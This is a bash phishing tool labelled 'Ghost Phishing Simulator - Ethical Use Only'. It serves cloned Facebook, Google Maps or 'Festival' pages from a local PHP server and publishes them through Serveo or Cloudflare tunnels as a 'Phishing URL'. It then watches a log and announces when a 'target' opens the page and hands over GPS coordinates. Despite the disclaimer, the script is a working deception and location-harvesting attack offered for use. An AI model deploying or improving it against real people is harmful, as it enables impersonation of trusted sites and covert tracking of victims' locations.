#!/bin/bash

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m'

# Banner
clear
echo -e "${BLUE}"
cat << "EOF"
   ▄████▄   ██▀███   ▒█████  ██▓ ███▄    █ 
  ▒██▀ ▀█  ▓██ ▒ ██▒▒██▒  ██▓██▒ ██ ▀█   █ 
  ▒▓█    ▄ ▓██ ░▄█ ▒▒██░  ██▒██▒▓██  ▀█ ██▒
  ▒▓▓▄ ▄██▒▒██▀▀█▄  ▒██   ██░██░▓██▒  ▐▌██▒
  ▒ ▓███▀ ░░██▓ ▒██▒░ ████▓▒░██░▒██░   ▓██░
  ░ ░▒ ▒  ░░ ▒▓ ░▒▓░░ ▒░▒░▒░ ░▓  ░ ▒░   ▒ ▒ 
    ░  ▒     ░▒ ░ ▒░  ░ ▒ ▒░  ▒ ░░ ░░   ░ ▒░
  ░          ░░   ░ ░ ░ ░ ▒   ▒ ░   ░   ░ ░ 
  ░ ░         ░         ░ ░   ░           ░ 
  ░                                         
EOF
echo -e "${NC}"
echo -e "${YELLOW}Ghost Phishing Simulator - Ethical Use Only${NC}"
echo "--------------------------------------------"

# Dependencies check
check_deps() {
    declare -A deps=(
        ["php"]="sudo apt install php"
        ["jq"]="sudo apt install jq"
        ["ssh"]="sudo apt install openssh-client"
    )

    for dep in "${!deps[@]}"; do
        if ! command -v $dep &> /dev/null; then
            echo -e "${RED}[!] $dep not found. Installing...${NC}"
            eval "${deps[$dep]}"
        fi
    done
}

# Start PHP server
start_server() {
    echo -e "${GREEN}[+] Starting PHP server...${NC}"
    php -S 127.0.0.1:8080 -t "$PAGE" > /dev/null 2>&1 &
    SERVER_PID=$!
}

# Serveo tunnel
serveo_tunnel() {
    echo -e "${GREEN}[+] Starting Serveo tunnel...${NC}"
    ssh -o StrictHostKeyChecking=no -R 80:localhost:8080 serveo.net > .tunnel_log 2>&1 &
    TUNNEL_PID=$!
    sleep 7
    URL=$(grep -o "https://[0-9a-z]*\.serveo.net" .tunnel_log)
}

# Cloudflare tunnel
cloudflare_tunnel() {
    if ! command -v cloudflared &> /dev/null; then
        echo -e "${RED}[!] cloudflared not found. Installing...${NC}"
        wget https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O cloudflared
        chmod +x cloudflared
        sudo mv cloudflared /usr/local/bin/
    fi
    echo -e "${GREEN}[+] Starting Cloudflare tunnel...${NC}"
    cloudflared tunnel --url http://localhost:8080 > .tunnel_log 2>&1 &
    TUNNEL_PID=$!
    sleep 10
    URL=$(grep -o "https://[0-9a-z]*\.trycloudflare.com" .tunnel_log)
}

# Cleanup
cleanup() {
    echo -e "\n${RED}[!] Stopping services...${NC}"
    kill $SERVER_PID $TUNNEL_PID 2> /dev/null
    rm -f .tunnel_log
    exit 0
}

# Main execution
check_deps

# Page selection
PS3='Select page to clone: '
options=("Facebook" "Google Maps" "Festival" "Quit")
select opt in "${options[@]}"; do
    case $opt in
        "Facebook") PAGE="facebook"; break ;;
        "Google Maps") PAGE="google"; break ;;
        "Festival") PAGE="festival"; break ;;
        "Quit") exit 0 ;;
        *) echo -e "${RED}Invalid option!${NC}" ;;
    esac
done

# Tunneling selection
PS3='Select tunneling method: '
options=("Serveo" "Cloudflare" "Quit")
select opt in "${options[@]}"; do
    case $opt in
        "Serveo") TUNNEL="serveo"; break ;;
        "Cloudflare") TUNNEL="cloudflare"; break ;;
        "Quit") exit 0 ;;
        *) echo -e "${RED}Invalid option!${NC}" ;;
    esac
done

start_server

case $TUNNEL in
    "serveo") serveo_tunnel ;;
    "cloudflare") cloudflare_tunnel ;;
esac

[ -z "$URL" ] && { echo -e "${RED}[!] Tunnel failed!${NC}"; cleanup; }

echo -e "\n${YELLOW}[+] Phishing URL: $URL${NC}"
echo -e "${BLUE}[+] Waiting for target... (Ctrl+C to stop)${NC}"

trap cleanup INT

# Monitoring
tail -f logs.txt | while read -r line; do
    DATA=$(echo "$line" | jq -r '.')
    case $(echo "$DATA" | jq -r '.status') in
        "page_loaded") echo -e "\n${CYAN}[+] Target opened page${NC}" ;;
        "location_denied") echo -e "${YELLOW}[!] Location denied${NC}" ;;
        "location_granted")
            echo -e "\n${GREEN}[✓] Location captured!${NC}"
            echo -e "   🌍 Lat: $(echo "$DATA" | jq -r '.lat')"
            echo -e "   🌎 Lon: $(echo "$DATA" | jq -r '.lon')"
            echo -e "   🕒 Time: $(echo "$DATA" | jq -r '.time')"
            cleanup
            ;;
    esac
done
